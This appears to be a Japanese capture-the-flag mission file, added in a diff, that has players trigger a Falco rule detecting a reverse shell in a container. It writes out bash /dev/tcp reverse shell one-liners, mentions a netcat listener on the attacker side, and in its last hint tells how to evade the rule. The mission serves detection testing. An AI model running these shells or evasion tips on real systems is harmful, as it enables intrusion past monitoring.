@@ -1,0 +1,85 @@
+┌──────────────────────────────────────────────────────────────────┐
+│ Operation NimbusBreach · Mission 08 — C2 Beacon                  │
+│ Type: TRIGGER · 難易度: ★★★★☆                                    │
+│ 目標 Falco ルール: "Redirect STDOUT/STDIN to Network Connection"  │
+└──────────────────────────────────────────────────────────────────┘
+
+# シナリオ
+
+backdoor は仕込んだ (Mission 07)。だが「あとで再アクセス」のための
+**reverse shell** を貼っておきたい。古典 reverse shell payload は
+**network socket fd を stdout / stderr に dup する** ことで、
+attacker server 側のターミナルにシェルを生やす。
+NimbusCorp の Falco は、まさにこの **dup 操作** を見ている。
+
+# ゴール
+
+このコンテナで Falco ルール「Redirect STDOUT/STDIN to Network
+Connection in Container」を発火させる。発火 = solve。
+
+# 背景
+
+reverse shell の最小 payload (Bash 版):
+
+  bash -i >& /dev/tcp/<attacker>/<port> 0>&1
+
+ここでやっている事:
+  1. `/dev/tcp/<host>/<port>` — bash builtin で TCP socket を open
+  2. `>&` で stdout/stderr をその socket fd に **dup2**
+  3. shell の interactive モード起動
+
+Falco rule は 2 番目の **dup2 (= dup syscall + dst fd ∈ {0,1,2})** が
+**ipv4/ipv6 socket fd を対象に行われたら** alert する。
+
+# 試すこと
+
+接続先は実在する outbound 可能なサーバ (DNS の 53/tcp は受ける):
+
+  bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
+
+bash の `<>` は:
+  - `connect(socket, "8.8.8.8:53")`
+  - `dup2(socketfd, 1)`  ← Falco 発火
+
+接続が成立しなくても、bash が dup2 する瞬間にルールは発火する
+場合がある。確実に発火させるには接続成立が必要。
+
+# クリア条件
+
+`Redirect STDOUT/STDIN to Network Connection in Container` が発火。
+
+# 環境にあるもの
+
+  /opt/ctf/missions/08-c2-beacon/fixtures/welcome.txt  ← このファイル
+
+────────────────────────────────────────────────────────────────────
+HINT 1 (易): bash の /dev/tcp
+────────────────────────────────────────────────────────────────────
+
+bash 5.x は **`/dev/tcp/<host>/<port>`** を built-in で扱える。
+fd リダイレクトと組み合わせると 1 行で reverse shell っぽい動作:
+
+  bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
+
+8.8.8.8:53 は Google Public DNS。TCP 53 を受けてくれる。
+
+────────────────────────────────────────────────────────────────────
+HINT 2 (中): 古典 reverse shell pattern
+────────────────────────────────────────────────────────────────────
+
+  bash -i >& /dev/tcp/8.8.8.8/53 0>&1
+
+これは PayloadsAllTheThings 等で出てくる典型 reverse shell payload。
+attacker 側で `nc -lp 53` していれば本物のシェルが取れる構造。
+
+────────────────────────────────────────────────────────────────────
+HINT 3 (Mission 10 への伏線)
+────────────────────────────────────────────────────────────────────
+
+このルールは **dup syscall + socket fd** を見る。回避には:
+  - そもそも dup2 を使わない (`curl` で済ます)
+  - socket を作らない (file 経由でやり取り)
+
+Mission 10 では reverse shell を使わずに目的達成する。
+
+参考: REFERENCE.md §3.6
